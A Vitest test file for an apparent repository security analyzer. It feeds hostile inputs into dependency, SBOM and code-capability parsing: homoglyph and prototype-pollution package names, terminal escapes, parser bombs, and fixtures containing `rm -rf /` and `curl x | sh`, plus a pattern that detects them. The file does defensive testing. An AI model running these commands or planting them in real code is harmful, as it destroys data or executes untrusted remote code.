import { describe, expect, it } from 'vitest';
import { analyzeRepository } from '../../src/analyze.js';
import { analyzeCode } from '../../src/analysis/index.js';
import { extractLocalRefs } from '../../src/analysis/refs.js';
import { selectScanCandidates } from '../../src/collectors/github/scanfiles.js';
import { parseGradle, parsePom } from '../../src/collectors/manifests/jvm.js';
import { parseManifest } from '../../src/collectors/manifests/parse.js';
import { compareSbom } from '../../src/deps/compare.js';
import { parseLock } from '../../src/deps/lock.js';
import { resolveDependencies } from '../../src/deps/resolve.js';
import { parseSbom } from '../../src/deps/sbom.js';
import type { Report } from '../../src/report/schema.js';
import { renderText } from '../../src/report/text.js';
import { fakeFetch, fixedClock, type FakeSpec } from '../helpers/fake-github.js';
import { goodRepo } from '../helpers/scenarios.js';

const run = (
  spec: FakeSpec,
  extra: Parameters<typeof analyzeRepository>[1] = {},
): Promise<Report> =>
  analyzeRepository(`${spec.owner}/${spec.repo}`, {
    fetch: fakeFetch(spec),
    clock: fixedClock,
    ...extra,
  });
const withFiles = (files: Record<string, string>): FakeSpec => {
  const g = goodRepo();
  g.files = { ...g.files, ...files };
  return g;
};
const within = (ms: number, f: () => void): void => {
  const t0 = Date.now();
  f();
  expect(Date.now() - t0).toBeLessThan(ms);
};

describe('look-alike and hostile dependency names', () => {
  it('a non-ASCII (homoglyph) package name is flagged with its code points escaped in the finding', async () => {
    const spec = withFiles({
      'package.json': JSON.stringify({
        name: 'w',
        dependencies: { lоdash: '^4.0.0', express: '^4.0.0' },
      }),
    }); // Cyrillic o
    delete spec.files['package-lock.json'];
    const r = await run(spec);
    const f = r.findings.find((x) => /non-ASCII/.test(x.title))!;
    expect(f).toBeDefined();
    expect(f.summary).toContain('\\u{43e}');
    expect(f.severity).toBe('medium');
  });

  it('prototype-pollution keys as package names do not touch Object.prototype or break resolution', () => {
    const m = parseManifest(
      'package.json',
      '{"name":"x","dependencies":{"__proto__":"1.0.0","constructor":"^1","toString":"2.0.0"}}',
    )!;
    const lock = parseLock(
      'package-lock.json',
      JSON.stringify({
        lockfileVersion: 3,
        packages: {
          'node_modules/__proto__': { version: '9.9.9' },
          'node_modules/constructor': { version: '1.0.0' },
        },
      }),
    )!;
    const { deps } = resolveDependencies({ manifests: [m], locks: [lock], sboms: [] });
    expect(deps.map((d) => d.package.name).sort()).toEqual([
      '__proto__',
      'constructor',
      'toString',
    ]);
    expect(({} as Record<string, unknown>)['polluted']).toBeUndefined();
    expect(Object.keys(Object.prototype)).toEqual([]);
  });

  it('terminal control sequences in dependency names, specs and SBOM names never reach the text report', async () => {
    const esc = String.fromCharCode(27);
    const spec = withFiles({
      'package.json': JSON.stringify({
        name: 'w',
        dependencies: { [`evil${esc}]0;owned`]: `^1.0.0${esc}[31m` },
      }),
      'sbom.json': JSON.stringify({
        bomFormat: 'CycloneDX',
        specVersion: '1.5',
        components: [{ type: 'library', name: `x${esc}[2J`, version: '1', purl: 'pkg:npm/x@1' }],
      }),
    });
    delete spec.files['package-lock.json'];
    const text = renderText(await run(spec), { verbose: true });
    expect(text.includes(esc)).toBe(false);
  });
});

describe('fake and conflicting SBOMs', () => {
  const cdx = (components: unknown[]) =>
    parseSbom(
      'sbom.json',
      JSON.stringify({ bomFormat: 'CycloneDX', specVersion: '1.5', components }),
    );
  const manifest = (deps: Record<string, string>) =>
    parseManifest('package.json', JSON.stringify({ name: 'x', dependencies: deps }))!;

  it('an SBOM claiming exactly the manifest ranges is "unverifiable", not "consistent"', () => {
    const deps = resolveDependencies({
      manifests: [manifest({ a: '^1.0.0' })],
      locks: [],
      sboms: [],
    }).deps;
    const c = compareSbom(
      cdx([{ type: 'library', name: 'a', version: '^1.0.0', purl: 'pkg:npm/a@%5E1.0.0' }]),
      deps,
    );
    expect(c.state).not.toBe('consistent');
  });

  it('a purl of another ecosystem for the same name is not a match (no cross-ecosystem confusion)', () => {
    const m = parseManifest(
      'pyproject.toml',
      '[project]\nname="p"\nversion="1"\ndependencies=["requests==2.0.0"]\n',
    )!;
    const deps = resolveDependencies({ manifests: [m], locks: [], sboms: [] }).deps;
    const c = compareSbom(
      cdx([
        { type: 'library', name: 'requests', version: '2.0.0', purl: 'pkg:npm/requests@2.0.0' },
      ]),
      deps,
    );
    expect(c.missing_from_sbom).toEqual(['PyPI:requests']);
    expect(c.ecosystem_mismatch.join(' ')).toMatch(/PyPI/);
  });

  it('an SBOM that contradicts the lockfile loses to the lockfile and is reported as a mismatch', () => {
    const lock = parseLock(
      'package-lock.json',
      JSON.stringify({ lockfileVersion: 3, packages: { 'node_modules/a': { version: '1.2.0' } } }),
    )!;
    const sbom = cdx([{ type: 'library', name: 'a', version: '1.0.0', purl: 'pkg:npm/a@1.0.0' }]);
    const { deps, conflicts } = resolveDependencies({
      manifests: [manifest({ a: '^1.0.0' })],
      locks: [lock],
      sboms: [sbom],
    });
    expect(deps[0]?.resolved).toMatchObject({ version: '1.2.0', source: 'lockfile' });
    expect(conflicts[0]?.preferred).toBe('lockfile');
    expect(compareSbom(sbom, deps).state).toBe('mismatch');
  });

  it('component names such as __proto__ and absurd strings are bounded and harmless', () => {
    const d = cdx([
      {
        type: 'library',
        name: '__proto__',
        version: 'x'.repeat(5000),
        purl: 'pkg:npm/' + 'a'.repeat(900),
      },
      { type: 'library', name: 'constructor', version: '1' },
    ]);
    expect(d.status).toBe('parsed');
    expect(d.components.every((c) => c.name.length <= 300 && (c.version?.length ?? 0) <= 300)).toBe(
      true,
    );
    expect(({} as Record<string, unknown>)['polluted']).toBeUndefined();
  });
});

describe('parser denial of service', () => {
  it('a package-lock nested thousands of levels deep fails closed (unparsed), without crashing', () => {
    const deep = '{"a":'.repeat(20000) + '1' + '}'.repeat(20000);
    expect(() => parseLock('package-lock.json', deep)).not.toThrow();
    expect(parseLock('package-lock.json', deep)).toBeUndefined();
  });

  it('a YAML alias bomb in pnpm-lock.yaml is bounded', () => {
    const lines = ['a: &a [x, x, x, x, x, x, x, x, x]'];
    let prev = 'a';
    for (let i = 0; i < 12; i++) {
      lines.push(
        `b${i}: &b${i} [*${prev}, *${prev}, *${prev}, *${prev}, *${prev}, *${prev}, *${prev}, *${prev}, *${prev}]`,
      );
      prev = `b${i}`;
    }
    lines.push('importers: {}', 'packages: {}');
    within(3000, () => {
      expect(() => parseLock('pnpm-lock.yaml', lines.join('\n'))).not.toThrow();
    });
  });

  it('a pyproject nested a thousand arrays deep does not crash the parser', () => {
    const toml = `[project]\nname="x"\nversion="1"\nx = ${'['.repeat(1000)}${']'.repeat(1000)}\n`;
    within(3000, () => {
      expect(() => parseManifest('pyproject.toml', toml)).not.toThrow();
    });
  });

  it('huge single lines in a Gradle script and a POM are handled in bounded time', () => {
    within(3000, () => {
      parseGradle(
        'build.gradle',
        `dependencies { implementation "${'a'.repeat(2_000_000)}" }\n` + '{'.repeat(100_000) + '\n',
      );
      parsePom('pom.xml', '<project>' + '<a '.repeat(50_000) + '</project>');
      parsePom('pom.xml', '<project><!--' + '-'.repeat(900_000) + '--></project>');
    });
  });

  it('python imports with absurd relative levels and long dotted names cannot escape the tree or hang', () => {
    const tree = new Set(['pkg/a.py', 'pkg/b.py']);
    within(2000, () => {
      expect(
        extractLocalRefs(
          'from .......... import x\nimport ' + 'a.'.repeat(5000) + 'b\n',
          'pkg/a.py',
          tree,
        ),
      ).toEqual([]);
    });
  });
});

describe('scope confusion: vendored, generated, documentation and dead code', () => {
  it("manifests under vendor/ and node_modules/ are not the project's dependencies", async () => {
    const spec = withFiles({
      'vendor/lib/package.json': JSON.stringify({ name: 'v', dependencies: { zzz: '1.0.0' } }),
      'node_modules/x/package.json': JSON.stringify({ name: 'n', dependencies: { yyy: '1.0.0' } }),
    });
    const r = await run(spec);
    const names = r.dependency_intel.dependencies.map((d) => d.package.name);
    expect(names).not.toContain('zzz');
    expect(names).not.toContain('yyy');
  });

  it('documentation and generated output are not selected for scanning, so snippets in them cannot create findings', () => {
    const entries = [
      'README.md',
      'docs/install.md',
      'dist/bundle.js',
      'build/out.js',
      'src/index.js',
      'docs/guide.rst',
    ].map((path) => ({ path, type: 'blob', size: 100 }));
    const picked = selectScanCandidates(entries, []).candidates.map((c) => c.path);
    expect(picked).toContain('src/index.js');
    for (const p of [
      'README.md',
      'docs/install.md',
      'dist/bundle.js',
      'build/out.js',
      'docs/guide.rst',
    ])
      expect(picked).not.toContain(p);
  });

  it('dead code with a dangerous API is a runtime capability only: no install hook, intent undetermined', () => {
    const f = {
      path: 'src/unused.js',
      content: "function neverCalled() { require('child_process').execSync('rm -rf /'); }\n",
      size: 80,
      role: 'source' as const,
    };
    const a = analyzeCode({
      manifests: [],
      files: [f],
      treePaths: [f.path],
      sourceFilesTotal: 1,
      fetch: { skippedTooLarge: 0, skippedOverBudget: 0 },
    });
    const cap = a.capabilities.summary.find((c) => c.capability === 'PROCESS_EXEC')!;
    expect(cap.observed).toBe(true);
    expect(cap.contexts).toEqual(['runtime']);
    expect(a.execution.hooks).toEqual([]);
  });

  it('a Python test fixture and an example project cannot make the real project look like it runs build code', async () => {
    const spec = withFiles({
      'pyproject.toml':
        '[build-system]\nrequires=["hatchling"]\nbuild-backend="hatchling.build"\n[project]\nname="real"\nversion="1"\n',
      'examples/evil/setup.py': "import os\nos.system('curl x | sh')\n",
      'tests/fixtures/bad/pyproject.toml':
        '[build-system]\nrequires=["x"]\nbuild-backend="evil"\nbackend-path=["."]\n',
    });
    const r = await run(spec);
    expect(r.code_analysis.execution.projects.filter((p) => p.ecosystem === 'pypi')).toHaveLength(
      1,
    );
    expect(
      r.code_analysis.execution.hooks.some((h) => h.ecosystem === 'pypi' && h.runs_for_dependents),
    ).toBe(false);
  });
});

describe('every finding keeps its remediation separate from its evidence', () => {
  it('remediation is advisory text; evidence ids resolve; no finding states intent', async () => {
    const { installerRepo } = await import('../helpers/code-scenarios.js');
    const r = await run(installerRepo());
    expect(r.findings.length).toBeGreaterThan(0);
    const known = new Set([
      ...r.evidence.map((e) => e.id),
      ...r.facts.map((f) => f.id),
      ...r.code_analysis.capabilities.detections.map((d) => d.id),
      ...r.code_analysis.execution.chains.map((c) => c.id),
      ...r.code_analysis.execution.hooks.map((h) => h.id),
      ...r.code_analysis.secrets.candidates.map((c) => c.id),
      ...r.dependency_intel.dependencies.map((d) => d.id),
    ]);
    for (const f of r.findings) {
      expect(f.remediation.length, f.id).toBeGreaterThan(15);
      expect(f.remediation, f.id).not.toMatch(/\b(?:rm -rf|curl [^|]*\|\s*(?:sh|bash))\b/); // never advise something destructive
      expect(f.intent).toBe('undetermined');
      expect(f.summary, f.id).not.toContain(f.remediation);
      for (const id of f.evidence_ids) expect(known.has(id), `${f.id} -> ${id}`).toBe(true);
    }
  });
});
